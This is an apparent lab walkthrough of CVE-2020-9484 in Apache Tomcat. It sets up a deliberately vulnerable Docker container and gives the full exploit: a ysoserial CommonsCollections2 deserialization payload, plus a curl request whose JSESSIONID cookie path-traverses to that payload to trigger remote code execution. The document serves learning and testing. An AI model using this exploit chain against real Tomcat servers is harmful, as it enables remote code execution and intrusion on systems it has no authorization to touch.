# CVE-2020-9484

## Description

When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if (a) an attacker is able to control the contents and name of a file on the server; and (b) the server is configured to use the PersistentManager with a FileStore; and (c) the PersistentManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and (d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control. Note that all of conditions (a) to (d) must be true for the attack to succeed.

## Setup

1. First get ysoserial.jar, which will be used for crafting the exploit.

    ```bash
    wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar
    ```

2. Next build and run the docker container.

    ```bash
    docker build . -t vulntomcat
    docker run -p 8080:8080 --name vulntomcatcontainer vulntomcat
    ```

    Some of the important files in the docker container are:

    ```xml
    <!-- /usr/local/tomcat/conf/server.xml -->
    <?xml version="1.0" encoding="UTF-8"?>
    <Context>
        <Manager className="org.apache.catalina.session.    PersistentManager" saveOnRestart="true">
            <Store className="org.apache.catalina.session.  FileStore" directory="/usr/local/tomcat/sessions"/>
        </Manager>
    </Context>
    ```

    This sets up Tomcat as the requirements for this CVE.

## Exploit

1. Now we generate the payload using ysoserial (a lot of extra flags because [Java is the world's best language, i am not joking, i love Java](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)).

    ```bash
    java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar yoserial.jar CommonsCollections2 'touch /tmp/pwned' > payload.session
    ```

2. Then we upload the payload to the server. Here we are just using docker cp to copy the file into the container.

    ```bash
    docker cp payload.session vulntomcatcontainer:/usr/local/tomcat/upload/payload.session
    ```

3. Finally, we send the crafted request to the server.

    ```bash
    curl -s -X GET http://localhost:8080/index.jsp -H "Cookie: JSESSIONID=../../../../../usr/local/tomcat/upload/payload"
    ```

    This will trigger the deserialization of the payload and execute the command.

4. If the command was executed successfully, you should see the file `/tmp/pwned` created.

    ```bash
    docker exec -it vulntomcatcontainer ls /tmp
    ```
